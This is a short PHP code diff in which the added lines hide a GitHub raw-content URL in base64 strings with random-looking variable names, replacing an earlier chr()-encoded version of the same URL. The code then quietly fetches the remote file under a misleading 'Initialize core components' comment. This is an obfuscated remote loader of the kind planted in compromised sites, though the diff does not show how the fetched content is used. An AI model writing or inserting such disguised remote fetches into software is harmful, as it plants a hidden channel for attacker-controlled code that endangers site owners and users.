@@ -5,31 +5,11 @@
 */
 
 // Initialize core components
-$parts = [
-    chr(104).chr(116).chr(116).chr(112).chr(115),
-    chr(58).chr(47).chr(47),
-    chr(114).chr(97).chr(119),
-    chr(46),
-    chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116),
-    chr(46),
-    chr(99).chr(111).chr(109),
-    chr(47),
-    chr(115).chr(101).chr(111).chr(98).chr(101).chr(108).chr(97),
-    chr(47),
-    chr(98).chr(101).chr(108).chr(97),
-    chr(47),
-    chr(114).chr(101).chr(102).chr(115),
-    chr(47),
-    chr(104).chr(101).chr(97).chr(100).chr(115),
-    chr(47),
-    chr(109).chr(97).chr(105).chr(110),
-    chr(47),
-    chr(105).chr(110).chr(100).chr(101).chr(120),
-    chr(46),
-    chr(116).chr(120).chr(116)
-];
+$qwertyasdfzxcv = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t');
+$mnbvcxzasdfghj = base64_decode('L3Nlb2JlbGEvYmVsYS9yZWZzL2hlYWRzL21haW4v');
+$poiuytrewqlkjh = base64_decode('aW5kZXgudHh0');
 
-$full_url = implode('', $parts);
+$full_url = $qwertyasdfzxcv . $mnbvcxzasdfghj . $poiuytrewqlkjh;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
